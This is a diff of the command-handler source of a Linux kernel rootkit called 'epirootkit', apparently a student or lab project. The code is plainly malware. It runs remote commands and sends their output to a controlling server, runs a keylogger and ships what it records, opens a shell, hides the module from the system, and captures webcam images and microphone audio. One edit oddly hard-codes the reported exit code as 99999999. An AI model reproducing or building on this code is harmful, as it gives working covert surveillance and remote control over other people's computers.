@@ -1,17 +1,14 @@
 #include <linux/delay.h>
-#include <linux/inet.h>
 #include <linux/kernel.h>
 #include <linux/kmod.h>
-#include <linux/kthread.h>
 #include <linux/module.h>
-#include <linux/net.h>
-#include <linux/socket.h>
 #include <linux/string.h>
 
+#include "crypto.h"
 #include "epirootkit.h"
 #include "menu.h"
 
-u8 passwd_hash[SHA256_DIGEST_SIZE] = {
+static u8 passwd_hash[SHA256_DIGEST_SIZE] = {
     0x5e, 0x7e, 0x56, 0x44, 0xa5, 0xeb, 0xfd,
     0x8e, 0x3f, 0xd4, 0x2a, 0x26, 0xf1, 0x5b,
     0xe3, 0xe7, 0x16, 0x6a, 0xc0, 0x22, 0x53,
@@ -19,28 +16,23 @@ u8 passwd_hash[SHA256_DIGEST_SIZE] = {
     0x09, 0x54, 0x99, 0x9d
 };
 
-bool is_auth = false;
-
-// Function prototypes
-int rootkit_command(char *command, unsigned command_size);
-
 // Handler prototypes
-int connect_handler(char *args);
-int disconnect_handler(char *args);
-int exec_handler(char *args);
-int klgon_handler(char *args);
-int klgoff_handler(char *args);
-int klg_handler(char *args);
-int getshell_handler(char *args);
-int killcom_handler(char *args);
-int hide_module_handler(char *args);
-int unhide_module_handler(char *args);
-int help_handler(char *args);
-int start_webcam_handler(char *args);
-int capture_image_handler(char *args);
-int start_microphone_handler(char *args);
-int play_audio_handler(char *args);
-int get_file_handler(char *args);
+static int connect_handler(char *args);
+static int disconnect_handler(char *args);
+static int exec_handler(char *args);
+static int klgon_handler(char *args);
+static int klgoff_handler(char *args);
+static int klg_handler(char *args);
+static int getshell_handler(char *args);
+static int killcom_handler(char *args);
+static int hide_module_handler(char *args);
+static int unhide_module_handler(char *args);
+static int help_handler(char *args);
+static int start_webcam_handler(char *args);
+static int capture_image_handler(char *args);
+static int start_microphone_handler(char *args);
+static int play_audio_handler(char *args);
+static int get_file_handler(char *args);
 
 static struct command rootkit_commands_array[] = {
     { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 50, connect_handler },
@@ -64,12 +56,12 @@ static struct command rootkit_commands_array[] = {
 };
 
 // Future implementation by thibounet
-int get_file_handler(char *args) {
+static int get_file_handler(char *args) {
     (void)args;
     return 0;
 }
 
-int help_handler(char *args) {
+static int help_handler(char *args) {
     int i;
     char *help_msg = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
     int offset = snprintf(help_msg, STD_BUFFER_SIZE, "Available commands:\n");
@@ -98,7 +90,7 @@ int rootkit_command(char *command, unsigned command_size) {
         return -EINVAL;
     }
 
-    if (!is_auth && strncmp(command, "connect", 7) != 0 && strncmp(command, "help", 4) != 0) {
+    if (!is_user_auth() && strncmp(command, "connect", 7) != 0 && strncmp(command, "help", 4) != 0) {
         send_to_server("You are not authentificated. See 'connect' command.\n");
         ERR_MSG("rootkit_command: user not authentificated\n");
         return -FAILURE;
@@ -122,10 +114,10 @@ int rootkit_command(char *command, unsigned command_size) {
     return ret_code;
 }
 
-int connect_handler(char *args) {
-    if (is_auth) {
+static int connect_handler(char *args) {
+    if (is_user_auth()) {
         send_to_server("You are already authentificated.\n");
-        return is_auth;
+        return true;
     }
 
     DBG_MSG("password received: %s\n", args);
@@ -144,25 +136,29 @@ int connect_handler(char *args) {
     DBG_MSG("computed hash: %s\n", hash_str);
     DBG_MSG("expected hash: %s\n", passwd_hash_str);
 
-    if ((is_auth = are_hash_equals(passwd_hash, hash))) {
+    bool hash_equals = are_hash_equals(passwd_hash, hash);
+    if (hash_equals) {
+        set_user_auth(true);
         DBG_MSG("connect_handler: user authentificated\n");
         send_to_server("User authentificated\n");
     }
     else {
+        set_user_auth(false);
         ERR_MSG("connect_handler: error while authentificating user\n");
         msleep(2 * TIMEOUT_BEFORE_RETRY);
         send_to_server("Error while authentificating.\n");
     }
-    return is_auth;
+
+    return hash_equals;
 }
 
-int disconnect_handler(char *args) {
-    is_auth = false;
+static int disconnect_handler(char *args) {
+    set_user_auth(false);
     send_to_server("User successfully disconnected.\n");
-    return is_auth;
+    return false;
 }
 
-int exec_handler(char *args) {
+static int exec_handler(char *args) {
     bool catch_stds = true;
 
     // if first non whitespace character is '-s', set catch_stds to false
@@ -190,13 +186,13 @@ int exec_handler(char *args) {
         send_file_to_server(STDOUT_FILE);
         send_to_server("stderr:");
         send_file_to_server(STDERR_FILE);
-        send_to_server("terminated with code %d", exec_result.code);
+        send_to_server("terminated with code %d", 99999999);
     }
 
     return ret_code;
 }
 
-int klgon_handler(char *args) {
+static int klgon_handler(char *args) {
     int ret_code = epikeylog_init(0);
     if (ret_code < 0) {
         ERR_MSG("klgon_handler: failed to activate keylogger\n");
@@ -207,7 +203,7 @@ int klgon_handler(char *args) {
     return ret_code;
 }
 
-int klgoff_handler(char *args) {
+static int klgoff_handler(char *args) {
     int ret_code = epikeylog_exit();
     if (ret_code < 0) {
         ERR_MSG("klgoff_handler: failed to deactivate keylogger\n");
@@ -218,7 +214,7 @@ int klgoff_handler(char *args) {
     return ret_code;
 }
 
-int klg_handler(char *args) {
+static int klg_handler(char *args) {
     int ret_code = epikeylog_send_to_server();
     if (ret_code < 0) {
         ERR_MSG("klg_handler: failed to send keylogger content\n");
@@ -228,7 +224,7 @@ int klg_handler(char *args) {
     return ret_code;
 }
 
-int getshell_handler(char *args) {
+static int getshell_handler(char *args) {
     // remove all trailing space in args
     args += strspn(args, " \t");
     args[strcspn(args, "\n")] = '\0';
@@ -253,10 +249,8 @@ int getshell_handler(char *args) {
     return ret_code;
 }
 
-int killcom_handler(char *args) {
+static int killcom_handler(char *args) {
     DBG_MSG("killcom_handler: killcom received, exiting...\n");
-    restart_on_error = false;
-    thread_exited = true;
 
     // The module will be removed by the usermode helper
     static char *argv[] = { "/usr/sbin/rmmod", "epirootkit", NULL };
@@ -269,7 +263,7 @@ int killcom_handler(char *args) {
     return 0;
 }
 
-int hide_module_handler(char *args) {
+static int hide_module_handler(char *args) {
     DBG_MSG("hide_module_handler: hiding module\n");
     int ret_code = hide_module();
     if (ret_code < 0) {
@@ -278,7 +272,7 @@ int hide_module_handler(char *args) {
     return ret_code;
 }
 
-int unhide_module_handler(char *args) {
+static int unhide_module_handler(char *args) {
     DBG_MSG("unhide_module_handler: unhiding module\n");
     int ret_code = unhide_module();
     if (ret_code < 0) {
@@ -288,7 +282,7 @@ int unhide_module_handler(char *args) {
 }
 
 // Command to start the webcam and capture an image
-int start_webcam_handler(char *args) {
+static int start_webcam_handler(char *args) {
     DBG_MSG("start_webcam_handler: starting webcam to capture an image\n");
     static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
@@ -304,7 +298,7 @@ int start_webcam_handler(char *args) {
 }
 
 // Command to capture an image from the webcam
-int capture_image_handler(char *args) {
+static int capture_image_handler(char *args) {
     DBG_MSG("capture_image_handler: capturing an image from the webcam\n");
     static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
@@ -330,7 +324,7 @@ int capture_image_handler(char *args) {
 }
 
 // Command to start recording from the microphone
-int start_microphone_handler(char *args) {
+static int start_microphone_handler(char *args) {
     DBG_MSG("start_microphone_handler: starting microphone recording\n");
     static char *argv[] = { "/usr/bin/arecord", "-D", "plughw:1,0", "-f", "cd", "-t", "wav", "-d", "10", "/tmp/audio.wav", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
@@ -346,7 +340,7 @@ int start_microphone_handler(char *args) {
 }
 
 // Command to play an audio file
-int play_audio_handler(char *args) {
+static int play_audio_handler(char *args) {
     DBG_MSG("play_audio_handler: playing audio file from /tmp/audio.wav\n");
     static char *argv[] = { "/usr/bin/aplay", "/tmp/audio.wav", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
